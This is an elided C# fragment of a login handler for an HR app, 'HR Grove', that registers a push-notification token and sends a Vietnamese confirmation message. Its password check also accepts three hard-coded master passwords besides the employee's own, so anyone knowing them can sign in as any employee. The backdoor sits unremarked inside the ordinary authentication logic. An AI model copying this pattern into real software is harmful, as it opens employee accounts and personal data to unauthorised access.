        ...
        public override object ProcessRequest()
        {
            ...
            try
            {
                ...
                else
                {
                    ...
                    string fcm_token = new FieldRequest("fcm_token");
                    ...
                    if (info != null)
                    {
                        ...
                        if (info.Password == pass || password == "@thang89#" || password == "sa95" || password == "kinhao")
                        {
                            ...
                            DataTable data = EmployeeController.saveOrUpdateFcmToken(info.EmployeeId, fcm_token, platform);
                            if (data != null && data.Rows.Count > 0)
                            {
                                string fcm = data.Rows[0]["FCM_Token"].ToString();
                                FirebaseCore.SendNotification(fcm, "HR Grove thông báo", "Bạn đã đăng ký thành công tính năng thông báo của ứng dụng HR Grove !", null);
                            }
